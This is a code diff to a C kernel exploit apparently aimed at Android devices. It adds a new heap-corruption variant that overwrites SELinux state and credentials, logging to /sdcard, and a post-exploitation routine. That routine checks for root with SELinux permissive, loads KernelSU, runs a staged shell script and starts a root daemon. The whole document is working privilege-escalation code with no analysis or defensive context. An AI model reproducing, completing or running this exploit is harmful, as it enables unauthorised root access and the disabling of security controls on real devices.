@@ -1,5 +1,6 @@
 #define _GNU_SOURCE 1
 #include <stdio.h>
+#include <stdarg.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
@@ -235,8 +236,8 @@ static int g_pairs=8192,g_delay=0,g_mode=0,g_att=3,g_reps=1,g_churn=0,g_chwait=5
 static unsigned long long g_fs[FSMAX];static int g_nfs=0;
 static unsigned long long g_fakekva;
 static int g_stage=0,g_ntg=0,g_selmode=1;
-static int selzero_mode(void){return getenv("O3P_SELZERO")!=NULL;}
-static int nocodepatch_mode(void){return getenv("O3P_NO_CODEPATCH")!=NULL;}
+static int selzero_mode(void){return getenv("O3P_SELDIRTY")==NULL;}
+static int nocodepatch_mode(void){return getenv("O3P_CODEPATCH")==NULL;}
 static void build_pattern(void){
   memset(pat,0,sizeof pat);
   { unsigned long long v=MARKVAL; memcpy(pat+mk,&v,8); }
@@ -315,8 +316,10 @@ static unsigned long long g_un=0,g_sel=0;
 #define FULL_CAP_MASK 0x1ffffffffffULL
 static int g_pfd=-1; static void *g_pmap=0; static unsigned long long g_fakekva=0;
 
-static int d3_mode(void){return getenv("O3P_D3")!=NULL;}
+static int d3_mode(void){return getenv("O3P_D3")!=NULL||getenv("O3P_D3V3")!=NULL;}
+static int d3v3_mode(void){return getenv("O3P_D3V3")!=NULL;}
 static unsigned long long d3_A[3],d3_off[3],d3_S[3];
+static void sdlog(const char *fmt, ...);
 static int d3_setup(void){
  unsigned long long rb[3]={TASK+0x870ULL,TASK+0x888ULL,TASK+0x8a0ULL};
  for(int i=0;i<3;i++){
@@ -328,16 +331,18 @@ static int d3_setup(void){
   d3_off[i]=d3_A[i]&0x1fffULL;
   if(d3_off[i]<0x200||d3_off[i]+0x118>0x1f80){printf("D3 off bad i=%d off=0x%llx\n",i,d3_off[i]);return 1;}
  }
- d3_S[0]=g_sel-7ULL; d3_S[1]=g_fakekva+0x10ULL; d3_S[2]=g_fakekva+0x18ULL;
+ if(d3v3_mode()){ d3_S[0]=PTASK+0x908ULL; d3_S[1]=g_sel-7ULL; d3_S[2]=g_fakekva+0x10ULL; }
+ else { d3_S[0]=g_sel-7ULL; d3_S[1]=g_fakekva+0x10ULL; d3_S[2]=g_fakekva+0x18ULL; }
  printf("D3ADDR a0=0x%llx a1=0x%llx a2=0x%llx off0=0x%llx off1=0x%llx off2=0x%llx\n",
         d3_A[0],d3_A[1],d3_A[2],d3_off[0],d3_off[1],d3_off[2]);fflush(stdout);
+ sdlog("D3ADDR a0=0x%llx a1=0x%llx a2=0x%llx off0=0x%llx off1=0x%llx off2=0x%llx\n",d3_A[0],d3_A[1],d3_A[2],d3_off[0],d3_off[1],d3_off[2]);
  return 0;
 }
 static void d3_build(void){
  memset(pat,0,sizeof pat);
  {unsigned long long v=MARKVAL;memcpy(pat+mk,&v,8);}
  for(int i=0;i<3;i++){
-  {unsigned long long v=0;memcpy(pat+d3_off[i]+0xe0,&v,8);}
+  {unsigned long long v=(d3v3_mode()&&i==0)?g_fakekva:0ULL;memcpy(pat+d3_off[i]+0xe0,&v,8);}
   {unsigned long long v=0;memcpy(pat+d3_off[i]+0xe8,&v,8);}
   {unsigned long long v=d3_S[i];memcpy(pat+d3_off[i]+0xf0,&v,8);}
  }
@@ -352,9 +357,19 @@ static int detect_d3(void){
   int b=1+3*i;
   printf("  E3[%d] 0x%llx=0x%llx 0x%llx=0x%llx 0x%llx=0x%llx\n",
          i,ad[b],vv[b],ad[b+1],vv[b+1],ad[b+2],vv[b+2]);
-  if(vv[b]||vv[b+1]||vv[b+2]!=d3_S[i])return 0;
+  {unsigned long long epc=(d3v3_mode()&&i==0)?g_fakekva:0ULL; if(vv[b]!=epc||vv[b+1]||vv[b+2]!=d3_S[i])return 0;}
  }
  return 1;
+}
+
+
+static void sdlog(const char *fmt, ...){
+ if(!getenv("O3P_SDLOG"))return;
+ int fd=open("/sdcard/o3p_sd.log",O_WRONLY|O_CREAT|O_APPEND,0644);
+ if(fd<0)return;
+ char b[256]; va_list ap; va_start(ap,fmt); int n=vsnprintf(b,sizeof b,fmt,ap); va_end(ap);
+ if(n>0){ssize_t w=write(fd,b,(size_t)n);(void)w;}
+ fsync(fd); close(fd);
 }
 
 static unsigned long long g_sec=0,g_usr=0,g_uc=0,g_gi=0;
@@ -389,6 +404,7 @@ static void repair_fake_cred(void){
 static int do_attempt(int att, pid_t *outpid){
  A=TASK=PTASK=0; close_skb(); int slabs0=slab_slabs();
  printf("== attempt %d slabs0=%d\n",att,slabs0);fflush(stdout);
+ sdlog("ATT %d stage=%d\n",att,g_stage);
  unpin0();
  {int np=precreate_pairs(g_pairs);printf("pairs=%d\n",np);fflush(stdout);}
  trunc_trace();wf(TR"/tracing_on","1\n");
@@ -469,8 +485,10 @@ static int do_attempt(int att, pid_t *outpid){
     S=d3_S[0];
   } else { if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908; }
 printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
+ sdlog("FAKEPAGE S=0x%llx\n",S);
  fill_fake_cred(N);
  if(d3_mode()&&g_stage==0)d3_build();else build_pattern();
+ sdlog("PAT built\n");
   int hit=0;
   printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
   printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
@@ -503,7 +521,9 @@ printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_
       if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
    }}
    printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
+   sdlog("SPRAY sent=%d alloc=%d\n",nsv,g_nalloc);
    hit=(d3_mode()&&g_stage==0)?detect_d3():detect_hit();
+   sdlog("DETECT hit=%d\n",hit);
    {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
     for(int j=0;j<g_nalloc;j++){
       if(g_alloc[j]==spv)vm++;
@@ -515,6 +535,7 @@ printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_
   int hit2=hit;(void)hit2;
   if(hit)printf("HIT pages=%ld\n",ppages);
   else printf("miss pages=%ld\n",ppages);fflush(stdout);
+  sdlog("HITMISS hit=%d pages=%ld\n",hit,ppages);
  { unsigned long long ad[3],vv[3];int n=0;ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=A+0x100;
    int g=read_addrs(ad,vv,n);
    if(g>0){printf("post rb_node=0x%llx next=0x%llx n100=0x%llx\n",vv[0],vv[1],vv[2]);
@@ -527,6 +548,7 @@ printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_
     printf("SP=0x%llx\n",(0xfffffffec0000000ULL+(((PAGE-0xffffff8000000000ULL)>>12)*0x40ULL)));fflush(stdout);}
  if(!hit){printf("VERDICT NO_RECLAIM\n");benign_cleanup(pid,zombie);return 1;}
  printf("FAKE_TREE_ARMED att=%d pages=%ld\n",att,ppages);fflush(stdout);
+ sdlog("ARMED att=%d\n",att);
  *outpid=pid;return 0;
 }
 /* ---------- reap: trigger stale-node zero write, verify ---------- */
@@ -969,8 +991,23 @@ static int ksu_load(unsigned long long slide){
   return done?0:-1;
 }
 
+static void armed_tail(pid_t pid){
+ printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
+ {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
+  int cr=(int)syscall(SYS_capget,&hh,dd);
+  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
+ if(g_armed){
+  root_proof();
+  stage_note("ROOT_OK");
+  if(g_un){ if(!getenv("O3P_NOKSU")) ksu_load(g_un-INIT_USER_NS_STATIC); } else { printf("KSU_SKIP no_slide\n");fflush(stdout); }
+  if(access("/data/local/tmp/o3p_post.sh",F_OK)==0){run_sh("sh /data/local/tmp/o3p_post.sh","/data/local/tmp/o3p_post.out",25000);read_file_print("/data/local/tmp/o3p_post.out","POSTOUT");}
+  rootd_start();rootd_cmd("id; echo ---; getenforce");
+ }
+ close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
+}
 static void reap_calib(pid_t pid){
  printf("== reap window stage=%d\n",g_stage);fflush(stdout);
+ sdlog("REAP stage=%d\n",g_stage);
  trunc_trace();wf(TR"/tracing_on","1\n");
  int st=0;pid_t wr=waitpid(pid,&st,0);
  repair_fake_cred();
@@ -998,6 +1035,13 @@ static void reap_calib(pid_t pid){
     if(ok)g_stage++;
    }
   }
+  if(d3v3_mode()){
+   int u=(int)getuid(),e=(int)geteuid(),enf=-1;
+   {int fd=open("/sys/fs/selinux/enforce",O_RDONLY);if(fd>=0){char b[8]={0};if(read(fd,b,7)>0)enf=atoi(b);close(fd);}}
+   printf("D3V3 uid=%d euid=%d enf=%d\n",u,e,enf);fflush(stdout);
+   if(u==0&&e==0&&enf==0)g_armed=1;
+   if(g_armed){armed_tail(pid);return;}
+  }
   read_file_print("/sys/fs/selinux/enforce","ENFORCE");
   {int fd=open("/data/local/tmp/canary_t34",O_WRONLY|O_CREAT,0666);printf("SHELL_CREATE fd=%d\n",fd);if(fd>=0)close(fd);}
   fflush(stdout);
@@ -1015,18 +1059,7 @@ static void reap_calib(pid_t pid){
     if(ok)g_armed=1;}
   }
  }
- printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
- {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
-  int cr=(int)syscall(SYS_capget,&hh,dd);
-  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
- if(g_armed){
-  root_proof();
-  stage_note("ROOT_OK");
-  if(g_un){ if(!getenv("O3P_NOKSU")) ksu_load(g_un-INIT_USER_NS_STATIC); } else { printf("KSU_SKIP no_slide\n");fflush(stdout); }
-  if(access("/data/local/tmp/o3p_post.sh",F_OK)==0){run_sh("sh /data/local/tmp/o3p_post.sh","/data/local/tmp/o3p_post.out",25000);read_file_print("/data/local/tmp/o3p_post.out","POSTOUT");}
-  rootd_start();rootd_cmd("id; echo ---; getenforce");
- }
- close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
+ armed_tail(pid);
 }
 static void perf_prepare(void){
  trunc_trace();
@@ -1087,6 +1120,7 @@ int main(int argc,char**argv){
    if(do_attempt(att,&armed_pid)==0){
      armed=1;
      printf("== armed, reap\n");fflush(stdout);
+     sdlog("PARENT armed\n");
      reap_calib(armed_pid);
       printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());fflush(stdout);
       if(g_armed)break;
